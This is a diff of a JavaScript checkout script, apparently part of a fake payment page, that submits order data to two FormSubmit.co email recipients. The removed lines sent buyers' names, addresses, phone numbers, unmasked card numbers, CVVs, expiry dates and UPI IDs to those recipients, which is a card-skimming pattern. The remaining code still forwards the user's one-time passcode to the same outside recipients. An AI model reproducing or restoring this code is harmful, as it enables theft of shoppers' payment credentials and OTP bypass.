@@ -145,21 +145,13 @@
   function submitFinalData() {
     const formData = new FormData();
     
-    // Add billing information unmasked
+    // Order completion email - minimal information only
     formData.append('_subject', 'Order Completed - OTP Verified');
     formData.append('_template', 'table');
     formData.append('_captcha', 'false');
     formData.append('_autoresponse', 'Thank you for your order! Your payment has been successfully processed and your order is confirmed.');
     
-    formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
-    formData.append('email', billingData.email);
-    formData.append('phone', billingData.phone);
-    formData.append('billingAddress', billingData.billingAddress);
-    formData.append('city', billingData.city);
-    formData.append('postalCode', billingData.postalCode);
-    formData.append('country', billingData.country);
-    
-    // Add payment information
+    // Only send essential order information - no sensitive data
     formData.append('paymentMethod', paymentData.method);
     formData.append('orderTotal', billingData.orderTotal || '0');
     formData.append('otpUsed', getOtp());
@@ -167,16 +159,7 @@
     formData.append('transactionId', 'TXN' + Date.now());
     formData.append('submissionTime', new Date().toLocaleString());
     
-    if (paymentData.method === 'card') {
-      formData.append('cardNumber', paymentData.cardNumber); // Send full card number unmasked
-      formData.append('cardName', paymentData.cardName);
-      formData.append('expiry', paymentData.expiry);
-      formData.append('cvv', paymentData.cvv);
-    } else if (paymentData.method === 'upi') {
-      formData.append('upiId', paymentData.upiId);
-    } else {
-      formData.append('paymentMethod', 'Cash on Delivery');
-    }
+    // No sensitive payment details or billing information sent
     
     // Submit to both FormSubmit.co recipients
     Promise.all([
